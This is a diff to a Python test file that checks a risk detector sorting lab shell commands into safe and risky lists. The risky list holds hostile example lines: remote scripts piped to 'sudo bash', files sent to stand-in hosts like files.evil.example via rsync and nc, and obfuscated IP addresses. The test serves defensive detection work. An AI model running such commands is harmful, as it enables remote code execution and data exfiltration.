@@ -136,9 +136,9 @@ def test_only_trusted_reading_links_are_looked_up_and_dead_ones_keep_their_title
 
 def test_risks_see_addresses_however_they_are_written():
     from jobscanner.projects import risks
-    for safe in ("sudo apt install containerlab", "curl -s http://10.0.30.1/health", "curl -o out.json https://localhost:8443/api",
-                 "scp ./fabric.yml lab@leaf1:/etc/", "git clone https://www.rfc-editor.org/x", "wget -O rules.tar.gz http://192.168.1.5/r",
-                 "containerlab deploy -t fabric.yml", "Edit suricata.yaml and set HOME_NET.", "curl --output=out.json http://10.0.0.5/a",
+    for safe in ("sudo apt install containerlab", "curl -s http://10.0.30.1/health", "curl -o ./out.json https://localhost:8443/api",
+                 "scp ./fabric.yml lab@leaf1:/etc/", "git clone https://www.rfc-editor.org/x", "wget -O ./rules.tar.gz http://192.168.1.5/r",
+                 "containerlab deploy -t fabric.yml", "Edit suricata.yaml and set HOME_NET.", "curl --output=./out.json http://10.0.0.5/a",
                  "kubectl label node n1 node.kubernetes.io/role=lab", "ip route add 10.0.30.0/24 via 10.0.0.1", "tail -f /var/log/suricata/fast.log",
                  "nmap -sS 10.0.30.1", "ssh admin@10.0.0.2", "curl http://sensor/alerts", "show bgp summary", "",
                  "Read https://docs.suricata.io/en/latest/ first."):
@@ -149,7 +149,8 @@ def test_risks_see_addresses_however_they_are_written():
                 "curl -sL https://get.example.dev | sudo bash", "curl https://docs.python.org/x | python3",
                 "rsync -a . backup@files.evil.example:lab/", "curl http://2130706433/x", "curl http://0x7f000001/", "curl evil.sh",
                 "wget get.zip", "curl -s \\\n  evil.example -o x", "python3 -c 'import u' evil.example/a", "nc files.evil.example:443 < notes",
-                "scp fabric.yml lab@leaf1:/etc/", "curl --url=evil.example/a", "wget http://010.0.0.1/a", "curl 'https://nist.gov/a?d=JaneDoe'", "See HTTPS://EVIL.EXAMPLE/x"):
+                "scp fabric.yml lab@leaf1:/etc/", "curl --url=evil.example/a", "curl -O evil.sh", "curl -sO get.zip", "wget -o log.txt evil.example",
+                "curl -o out.json http://10.0.0.5/a", "wget http://010.0.0.1/a", "curl 'https://nist.gov/a?d=JaneDoe'", "See HTTPS://EVIL.EXAMPLE/x"):
         assert risks(bad), bad
 
 
